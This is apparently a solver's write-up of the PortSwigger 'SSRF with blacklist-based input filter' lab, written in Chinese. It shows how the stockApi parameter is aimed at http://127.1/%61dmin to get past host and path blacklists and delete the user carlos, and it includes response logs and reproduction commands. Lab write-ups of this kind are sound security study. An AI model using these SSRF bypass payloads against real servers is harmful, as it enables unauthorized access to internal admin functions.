---
title: "lab-ssrf-with-blacklist-filter"
links:
  - target: ssrf-family
    relation: evidences
---

# lab-ssrf-with-blacklist-filter

> evidences: [[ssrf-family]]

- 题面:SSRF with blacklist-based input filter(/web-security/ssrf/lab-ssrf-with-blacklist-filter)
  - 台账里的路径 `/ssrf/blind/lab-ssrf-with-blacklist-filter` 是错 slug(404);真题在 `/ssrf/lab-ssrf-with-blacklist-filter`。
- 实例:https://0a17000a032cb044834ce1ad00ca0041.web-security-academy.net
- 判定目标:stockApi 取内网 `http://localhost/admin`,删 carlos;绕两道弱防(host 黑名单 + 路径黑名单)

## 关键步

1. 侦察:产品页 `POST /product/stock`(`stockApi` 表单)→ 服务端代为请求该 URL 并回显上游响应。
2. 探黑名单:`stockApi=http://127.1/admin` → `400 External stock check blocked for security reasons`;
   `stockApi=http://127.1/Admin`、`http://127.1/%61dmin` → `200`(admin 面板)。
3. 绕过:host 用 `127.1`;路径 `admin` 用单次 URL 编码 `%61dmin`(黑名单只匹字面 `admin`,大小写/编码即过)。
4. 收尾:`stockApi=http://127.1/%61dmin/delete?username=carlos` → `302 /admin`。

## 交册值

`stockApi=http://127.1/%61dmin/delete?username=carlos`(host 紧凑写法 + 路径编码绕过)。

## 证据摘录

```
POST /product/stock  stockApi=http://127.1/admin        -> 400 "External stock check blocked for security reasons"
POST /product/stock  stockApi=http://127.1/%61dmin      -> 200 (Users: wiener, carlos; /admin/delete?username=carlos)
POST /product/stock  stockApi=http://127.1/%61dmin/delete?username=carlos -> 302 Location: /admin
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter" --out /tmp/l5-ssrfbl-page.html
lab_launch launch F97F7DF5A96DA8563EDC18E5544B8EF962F8EE47ABD9B9BB3D30706F15BFF341 --widget-source /web-security/ssrf --jar /tmp/mar-jar.json
lab_http post "<inst>/product/stock" --form stockApi=http://127.1/%61dmin --jar /tmp/mar-jar.json
lab_http post "<inst>/product/stock" --form 'stockApi=http://127.1/%61dmin/delete?username=carlos' --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

要点:两道弱防 = host 字面黑名单(127.1 过)+ 路径字面黑名单(%61dmin 过);行为差(400 vs 200)即判读面。
